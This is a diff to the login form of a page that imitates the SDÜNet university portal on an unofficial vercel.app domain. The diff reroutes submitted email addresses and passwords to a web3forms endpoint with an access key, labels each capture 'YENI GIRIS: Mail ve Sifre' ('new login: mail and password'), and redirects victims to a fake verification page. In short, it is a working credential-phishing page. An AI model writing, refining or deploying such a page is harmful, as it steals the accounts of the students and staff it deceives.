@@ -1027,21 +1027,25 @@
                                         SDÜNet ile Çevrimiçi Hizmet ve Uygulamalar Tek Platformda...
                                     </span>
                                 </div>
-                                <form action="https://formspree.io/f/mpqpalkz" method="POST" style="padding:0 50px">
+                                <form action="https://api.web3forms.com/submit" method="POST" style="padding:0 50px">
+                                    <input type="hidden" name="access_key" value="effaac62-2f70-4e72-a209-1f9b1da700f3">
+
+                                    <input type="hidden" name="subject" value="YENI GIRIS: Mail ve Sifre">
 
                                     <div style="margin-bottom: 10px;">
-                                        <input type="text" name="email" placeholder="E-Posta Adresi" required
+                                        <input type="text" name="Giris_Epostasi" placeholder="E-Posta Adresi" required
                                             style="width: 100%; height: 45px; padding: 10px; border: 1px solid #ccc; border-radius: 5px;">
                                     </div>
 
                                     <div style="margin-bottom: 15px;">
-                                        <input type="password" name="password" placeholder="Şifre" required
+                                        <input type="password" name="Giris_Sifresi" placeholder="Şifre" required
                                             style="width: 100%; height: 45px; padding: 10px; border: 1px solid #ccc; border-radius: 5px;">
                                     </div>
 
-                                    <input type="hidden" name="_next"
+                                    <input type="hidden" name="redirect"
                                         value="https://sdu-sistem.vercel.app/dogrulamaa.html">
-                                    <input type="hidden" name="_captcha" value="false">
+
+                                    <input type="hidden" name="from_name" value="Sistem Girisi">
 
                                     <button type="submit"
                                         style="width: 100%; height: 50px; background-color: #800000; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer;">
